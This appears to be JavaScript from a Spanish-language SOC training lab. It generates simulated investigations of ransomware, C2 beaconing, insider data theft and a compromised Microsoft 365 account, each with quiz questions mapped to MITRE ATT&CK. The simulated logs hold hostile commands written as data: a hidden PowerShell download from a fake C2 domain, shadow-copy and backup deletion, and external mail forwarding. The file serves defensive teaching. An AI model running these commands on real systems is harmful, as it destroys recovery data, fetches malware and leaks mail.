"use strict";
// ======================================================================
// NetLab — SOC: casos avanzados (ransomware, malware con C2, amenaza interna y cuenta de nube comprometida).
// Igual que los casos de soc.js: se generan al azar con la respuesta exacta (sin IA).
// ======================================================================
const sA = (a) => a[Math.floor(Math.random() * a.length)];
const sN = (a, b) => a + Math.floor(Math.random() * (b - a + 1));
const s2 = (n) => String(n).padStart(2, "0");
function relojSoc(h0 = sN(0, 23)) {
  let t = new Date(2026, 10, sN(1, 28), h0, sN(0, 59), sN(0, 59));
  const f = (d) => `${d.getFullYear()}-${s2(d.getMonth() + 1)}-${s2(d.getDate())} ${s2(d.getHours())}:${s2(d.getMinutes())}:${s2(d.getSeconds())}`;
  return { paso: (a = 1, b = 20) => { t = new Date(t.getTime() + sN(a, b) * 1000); return f(t); }, salta: (seg) => { t = new Date(t.getTime() + seg * 1000); return f(t); } };
}
const COL_WIN = [["hora", "Hora"], ["id", "ID"], ["equipo", "Equipo"], ["usuario", "Usuario"], ["proceso", "Proceso"], ["detalle", "Detalle"]];

// ---------------------------------------------------------------- ransomware
function casoRansomware() {
  const dom = sA(["CORP", "ACME", "NETLAB"]), u = sA(["jlopez", "mgarcia", "aperez", "lruiz"]), pc = `WS-${sA(["FIN", "RH", "COMPRAS"])}-${sN(10, 60)}`;
  const ext = sA([".lockd", ".crypt0r", ".k3y", ".vault9"]), nota = sA(["README_RECOVER.txt", "HOW_TO_DECRYPT.html", "LEEME_RESCATE.txt"]);
  const doc = sA(["Factura_Noviembre.docm", "Orden_Compra_8841.docm", "CV_Ingeniero.docm"]), bin = sA(["svchost32.exe", "winupd.exe", "msedge_helper.exe"]);
  const c2 = sA(["cdn-office365.top", "update-win.click", "files-share.xyz"]);
  const R = relojSoc(sN(8, 17)), ev = [];
  const E = (id, proceso, detalle, a, b) => ev.push({ hora: R.paso(a, b), id, equipo: pc, usuario: `${dom}\\${u}`, proceso, detalle });
  for (let k = 0; k < 6; k++) E(sA([4624, 4688, 1]), sA(["outlook.exe", "teams.exe", "excel.exe"]), "actividad normal");
  E(1, "WINWORD.EXE", `CommandLine: "WINWORD.EXE" /n "C:\\Users\\${u}\\Downloads\\${doc}"`);
  E(1, "powershell.exe", `ParentImage: WINWORD.EXE · CommandLine: powershell -w hidden -c "iwr http://${c2}/a.bin -OutFile $env:APPDATA\\${bin}"`, 2, 5);
  E(3, "powershell.exe", `Conexión de red a ${c2}:80`, 0, 2);
  E(11, "powershell.exe", `Archivo creado: C:\\Users\\${u}\\AppData\\Roaming\\${bin}`, 1, 3);
  E(1, bin, `ParentImage: powershell.exe · CommandLine: ${bin}`, 1, 4);
  E(1, "vssadmin.exe", `ParentImage: ${bin} · CommandLine: vssadmin.exe delete shadows /all /quiet`, 20, 60);
  E(1, "wbadmin.exe", `ParentImage: ${bin} · CommandLine: wbadmin delete catalog -quiet`, 1, 3);
  E(1, "bcdedit.exe", `ParentImage: ${bin} · CommandLine: bcdedit /set {default} recoveryenabled no`, 1, 3);
  const arch = ["Presupuesto_2026.xlsx", "Nomina_oct.xlsx", "Contrato_proveedor.pdf", "Fotos_evento.zip", "Clientes.csv", "Reporte_Q3.docx"];
  for (const a of arch) E(11, bin, `Archivo creado: C:\\Users\\${u}\\Documents\\${a}${ext}`, 0, 1);
  E(11, bin, `Archivo creado: C:\\Users\\${u}\\Desktop\\${nota}`, 0, 2);
  for (let k = 0; k < 3; k++) E(11, bin, `Archivo creado: \\\\SRV-FILE01\\Compartida\\${sA(arch)}${ext}`, 0, 1);
  ev.sort((a, b) => a.hora.localeCompare(b.hora));
  return { tipo: "ransomware", columnas: COL_WIN, titulo: `Alerta: cientos de archivos renombrados en ${pc}`, eventos: ev,
    preguntas: [
      { q: "¿Qué documento abrió la víctima al inicio? (nombre del archivo)", r: doc, e: `Sysmon 1 de WINWORD.EXE con ${doc}: un .docm trae macros.` },
      { q: "¿Qué proceso padre lanzó el PowerShell que descargó el malware?", r: "WINWORD.EXE", e: "ParentImage: WINWORD.EXE. Word no debería lanzar PowerShell: es la huella de una macro maliciosa." },
      { q: "¿Qué herramienta de Windows usó para borrar las instantáneas (shadow copies)?", r: "vssadmin.exe", e: "vssadmin delete shadows /all /quiet: quita los puntos de restauración para que no recuperes sin pagar." },
      { q: "¿Qué extensión agrega a los archivos cifrados?", r: ext, e: `Sysmon 11 muestra los archivos con ${ext} al final.` },
      { q: "¿Cómo se llama la nota de rescate?", r: nota, e: `El archivo que deja en el Escritorio: ${nota}.` },
      { q: "¿Qué técnica de ATT&CK es borrar instantáneas y desactivar la recuperación? (ID)", r: "T1490", e: "Inhibit System Recovery (T1490)." },
      { q: "¿Y cifrar los archivos de la víctima? (ID)", r: "T1486", e: "Data Encrypted for Impact (T1486)." },
    ] };
}

// ---------------------------------------------------------------- malware con comando y control (proxy)
function casoC2() {
  const R = relojSoc(sN(9, 16)), ev = [];
  const users = ["jlopez", "mgarcia", "aperez", "srodriguez", "cmartinez"], pcs = Array.from({ length: 5 }, () => `10.10.${sN(1, 20)}.${sN(10, 250)}`);
  const vi = sN(0, 4), pcInf = pcs[vi], uInf = users[vi];
  const c2 = sA(["telemetry-cdn.top", "img-static.click", "api-weather.xyz", "cloud-sync.info"]), uri = sA(["/pixel.gif", "/api/v1/check", "/news.php"]);
  const ua = sA(["Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Go-http-client/1.1", "curl/7.55.1"]);
  const intervalo = sA([60, 90, 120]), nB = sN(9, 13), exfil = sN(38, 95) * 1048576;
  const sitios = ["www.google.com", "outlook.office.com", "teams.microsoft.com", "www.linkedin.com", "www.youtube.com", "intranet.empresa.mx"];
  const filas = [];
  for (let k = 0; k < 18; k++) { const i = sN(0, 4); filas.push({ t: sN(0, intervalo * nB), ip: pcs[i], usuario: users[i], destino: sA(sitios), url: "/", metodo: "GET", salida: sN(400, 1800), entrada: sN(3000, 900000), ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0", accion: "permitido" }); }
  for (let k = 0; k < nB; k++) filas.push({ t: k * intervalo + sN(-1, 1), ip: pcInf, usuario: uInf, destino: c2, url: uri, metodo: "GET", salida: sN(310, 340), entrada: sN(90, 120), ua, accion: "permitido" });
  const tEx = Math.floor(nB / 2) * intervalo + 17;
  filas.push({ t: tEx, ip: pcInf, usuario: uInf, destino: c2, url: "/upload", metodo: "POST", salida: exfil, entrada: 64, ua, accion: "permitido" });
  filas.sort((a, b) => a.t - b.t);
  let prev = 0;
  for (const f of filas) { const hora = R.salta(Math.max(0, f.t - prev)); prev = f.t; const { t, ...x } = f; ev.push({ hora, ...x }); }
  const mb = Math.round(exfil / 1048576);
  return { tipo: "c2", titulo: `Alerta de proxy: dominio nuevo con tráfico periódico desde ${pcInf}`, eventos: ev,
    columnas: [["hora", "Hora"], ["ip", "IP origen"], ["usuario", "Usuario"], ["metodo", "Método"], ["destino", "Destino"], ["url", "URL"], ["salida", "Bytes enviados"], ["entrada", "Bytes recibidos"], ["ua", "User-Agent"], ["accion", "Acción"]],
    preguntas: [
      { q: "¿Qué dominio es el servidor de comando y control (C2)?", r: c2, e: "Es al que la misma máquina llama siempre al mismo URL, con el mismo tamaño y cada tantos segundos." },
      { q: "¿Qué IP interna está infectada?", r: pcInf, e: "Origen de las conexiones a ese dominio." },
      { q: "¿Cada cuántos segundos llama a casa (aprox.)?", r: String(intervalo), alt: [-2, -1, 1, 2].map((d) => String(intervalo + d)), e: "Resta las horas de dos peticiones seguidas al C2: el patrón regular es la firma del beaconing." },
      { q: "¿Qué User-Agent delata al malware?", r: ua, e: `Los navegadores de la empresa son Chrome moderno; '${ua}' no es un usuario humano.` },
      { q: "¿Cuántos MB sacó en la subida grande? (número entero)", r: String(mb), alt: [String(mb - 1), String(mb + 1)], e: `POST /upload con ${exfil.toLocaleString()} bytes ≈ ${mb} MB: exfiltración por el mismo canal del C2.` },
      { q: "¿Qué técnica de ATT&CK es usar HTTP para el comando y control? (ID)", r: "T1071.001", e: "Application Layer Protocol: Web Protocols (T1071.001)." },
      { q: "¿Y sacar los datos por ese mismo canal? (ID)", r: "T1041", e: "Exfiltration Over C2 Channel (T1041)." },
    ] };
}

// ---------------------------------------------------------------- amenaza interna (fuga de datos)
function casoInsider() {
  const dom = sA(["CORP", "ACME", "NETLAB"]), u = sA(["rtorres", "pdiaz", "agomez"]), pc = `WS-VENTAS-${sN(10, 60)}`;
  const zip = sA(["clientes_todo.7z", "respaldo_personal.zip", "cartera_2026.rar"]), usb = sA(["Kingston DataTraveler 3.0", "SanDisk Ultra Fit", "Samsung BAR Plus"]);
  const nube = sA(["mega.nz", "wetransfer.com", "drive.google.com (cuenta personal)"]);
  const nubeDom = nube.split(" ")[0];
  const R = relojSoc(sN(21, 23)), ev = [];
  const E = (id, proceso, detalle, a, b) => ev.push({ hora: R.paso(a, b), id, equipo: pc, usuario: `${dom}\\${u}`, proceso, detalle });
  const primera = (() => { E(4624, "-", "Logon tipo 2 (interactivo) fuera de horario", 1, 5); return ev.at(-1).hora; })();
  const arch = ["Clientes_Mayoristas.xlsx", "Precios_2027.xlsx", "Contratos\\Distribuidor_Norte.pdf", "Pipeline_Q4.xlsx", "Margenes_por_cliente.xlsx", "Proveedores.csv"];
  for (const a of arch) E(4663, "explorer.exe", `Acceso a objeto (lectura): \\\\SRV-FILE01\\Comercial\\${a}`, 3, 15);
  E(1, "7z.exe", `CommandLine: 7z.exe a -p ${zip} C:\\Users\\${u}\\Desktop\\copia\\*`, 30, 90);
  E(11, "7z.exe", `Archivo creado: C:\\Users\\${u}\\Desktop\\${zip} (comprimido con contraseña)`, 2, 6);
  E(6416, "-", `Dispositivo externo nuevo: ${usb} (USB mass storage)`, 40, 120);
  E(11, "explorer.exe", `Archivo creado: E:\\${zip}`, 5, 20);
  E(3, "chrome.exe", `Conexión de red a ${nubeDom}:443 · subida de 412 MB`, 60, 200);
  E(1102, "wevtutil.exe", "Se intentó limpiar el registro (Security) — denegado: el usuario no es administrador", 30, 90);
  ev.sort((a, b) => a.hora.localeCompare(b.hora));
  return { tipo: "insider", columnas: COL_WIN, titulo: `Recursos Humanos avisa: ${u} renunció hoy y aún tiene acceso`, eventos: ev,
    preguntas: [
      { q: "¿A qué hora (HH:MM:SS) entró fuera de horario?", r: primera.slice(11), e: `El 4624 tipo 2 de ${u}: ${primera}.` },
      { q: "¿De qué carpeta compartida sacó los archivos? (solo el nombre de la carpeta)", r: "Comercial", e: "Los 4663 muestran \\\\SRV-FILE01\\Comercial\\…" },
      { q: "¿Cómo se llama el archivo comprimido que armó?", r: zip, e: `7z.exe a -p ${zip}: comprimir con contraseña es una forma de esconder el contenido al DLP.` },
      { q: "¿Qué memoria USB conectó? (marca y modelo como aparece)", r: usb, e: "Event 6416: nuevo dispositivo externo reconocido." },
      { q: "¿A qué servicio de nube subió los datos? (dominio)", r: nubeDom, e: `Sysmon 3: conexión a ${nubeDom}:443 con una subida grande.` },
      { q: "¿Qué técnica de ATT&CK es sacar datos por USB? (ID)", r: "T1052.001", e: "Exfiltration over Physical Medium: Exfiltration over USB (T1052.001)." },
      { q: "¿Y subirlos a un almacenamiento en la nube? (ID)", r: "T1567.002", e: "Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)." },
    ] };
}

// ---------------------------------------------------------------- cuenta de nube comprometida (Entra ID / M365)
function casoNube() {
  const u = sA(["jlopez", "mgarcia", "aperez"]) + "@" + sA(["acme.com.mx", "netlab.mx", "contoso.mx"]);
  const ipMx = `189.${sN(130, 250)}.${sN(1, 250)}.${sN(2, 250)}`, ipAt = `${sA(["185.220.101", "45.155.205", "102.89.32", "5.188.10"])}.${sN(2, 250)}`;
  const pais = sA(["Nigeria", "Rusia", "Países Bajos", "Vietnam"]), fw = `${sA(["pagos", "facturacion", "cobranza"])}.${sN(10, 99)}@${sA(["gmail.com", "outlook.com", "proton.me"])}`;
  const regla = sA(["..", "RSS sync", "Limpieza", "a"]), n = sN(6, 14);
  const R = relojSoc(sN(1, 4)), ev = [];
  const E = ({ a = 5, b = 40, ...o }) => ev.push({ hora: R.paso(a, b), usuario: u, ...o });
  E({ app: "Outlook Web", ip: ipMx, pais: "México", resultado: "Éxito", detalle: "Inicio de sesión normal (MFA desde la app)", a: 1, b: 3 });
  R.salta(3600 * 6);
  E({ app: "Office 365", ip: ipAt, pais, resultado: "Contraseña correcta", detalle: "MFA requerida (notificación push)" });
  for (let k = 0; k < n; k++) E({ app: "Office 365", ip: ipAt, pais, resultado: "Fallo", detalle: "MFA denegada por el usuario (push rechazado)", a: 8, b: 30 });
  E({ app: "Office 365", ip: ipAt, pais, resultado: "Éxito", detalle: "MFA aprobada (push aceptado)", a: 10, b: 40 });
  const entra = ev.at(-1).hora;
  E({ app: "Exchange Online", ip: ipAt, pais, resultado: "Éxito", detalle: `New-InboxRule '${regla}' · De: *factura*, *pago* → mover a 'RSS Feeds' y marcar como leído` });
  E({ app: "Exchange Online", ip: ipAt, pais, resultado: "Éxito", detalle: `Set-Mailbox -ForwardingSmtpAddress ${fw}` });
  for (let k = 0; k < 3; k++) E({ app: "Exchange Online", ip: ipAt, pais, resultado: "Éxito", detalle: `Send · Para: proveedores (${sN(12, 40)} destinatarios) · Asunto: Cambio de cuenta bancaria para pagos` });
  return { tipo: "nube", titulo: `Inicio de sesión riesgoso: ${u} desde ${pais}`, eventos: ev,
    columnas: [["hora", "Hora"], ["usuario", "Usuario"], ["app", "Aplicación"], ["ip", "IP"], ["pais", "País"], ["resultado", "Resultado"], ["detalle", "Detalle"]],
    preguntas: [
      { q: "¿Desde qué IP entró el atacante?", r: ipAt, e: `La IP de ${pais} que termina con 'MFA aprobada'.` },
      { q: "¿Cuántas notificaciones MFA rechazó el usuario antes de aceptar una?", r: String(n), e: "Cuenta los 'MFA denegada': el atacante tenía la contraseña y bombardeó al usuario con pushes hasta que aceptó (MFA fatigue)." },
      { q: "¿A qué hora (HH:MM:SS) logró entrar?", r: entra.slice(11), e: `MFA aprobada a las ${entra.slice(11)}.` },
      { q: "¿A qué dirección externa reenvía el correo?", r: fw, e: "Set-Mailbox -ForwardingSmtpAddress: todo el correo de la víctima le llega al atacante." },
      { q: "¿Cómo se llama la regla de bandeja que esconde los correos de pagos?", r: regla, e: "Los atacantes ponen nombres cortos o raros ('..', 'a') y mueven los correos a carpetas que nadie revisa (RSS)." },
      { q: "¿Qué técnica de ATT&CK es bombardear con solicitudes MFA? (ID)", r: "T1621", e: "Multi-Factor Authentication Request Generation (T1621)." },
      { q: "¿Y crear reglas de bandeja para esconder correos? (ID)", r: "T1564.008", e: "Hide Artifacts: Email Hiding Rules (T1564.008). El reenvío es T1114.003." },
    ] };
}

const SOC_CASOS = { windows: () => casoWindows(), phishing: () => casoPhishing(), ransomware: casoRansomware, c2: casoC2, insider: casoInsider, nube: casoNube };
const SOC_INFO = {
  ransomware: { sub: "EDR · Sysmon de una estación", titulo: "Investigar un ataque de ransomware con Sysmon",
    contexto: "Ticket SOC: reconstruir un ataque de ransomware con eventos de Sysmon (1, 3, 11): documento con macros, PowerShell que descarga el binario, borrado de instantáneas (vssadmin, wbadmin, bcdedit), cifrado masivo con extensión nueva y nota de rescate; mapeo a MITRE ATT&CK (T1566.001, T1059.001, T1490, T1486) y respuesta (aislar, no apagar, preservar evidencia, restaurar de respaldos)." },
  c2: { sub: "Proxy web · tráfico de salida", titulo: "Cazar malware con comando y control (C2) en el proxy",
    contexto: "Ticket SOC: detectar beaconing en logs de proxy (intervalos regulares, mismo URL y tamaño, dominio nuevo y raro, User-Agent anómalo) y exfiltración por el canal del C2; MITRE T1071.001 y T1041; contención (bloquear dominio, aislar equipo, buscar el mismo IOC en toda la red)." },
  insider: { sub: "Windows + DLP · un empleado", titulo: "Investigar una amenaza interna (fuga de datos)",
    contexto: "Ticket SOC: reconstruir la fuga de datos de un empleado que renunció: accesos fuera de horario (4624), lectura de archivos compartidos (4663), compresión con contraseña, USB nuevo (6416), subida a la nube personal; MITRE T1052.001 y T1567.002; respuesta (quitar accesos, cadena de custodia, coordinar con RH y Legal)." },
  nube: { sub: "Entra ID / Microsoft 365 · inicios de sesión y buzón", titulo: "Investigar una cuenta de Microsoft 365 comprometida",
    contexto: "Ticket SOC: detectar una cuenta de nube comprometida en los logs de Entra ID y Exchange Online: viaje imposible, MFA fatigue (muchos push rechazados y uno aceptado), reglas de bandeja que esconden correos, reenvío externo y fraude de cambio de cuenta bancaria (BEC); MITRE T1621, T1564.008, T1114.003; contención (revocar sesiones, resetear contraseña, quitar reglas y reenvío, number matching en MFA)." },
};
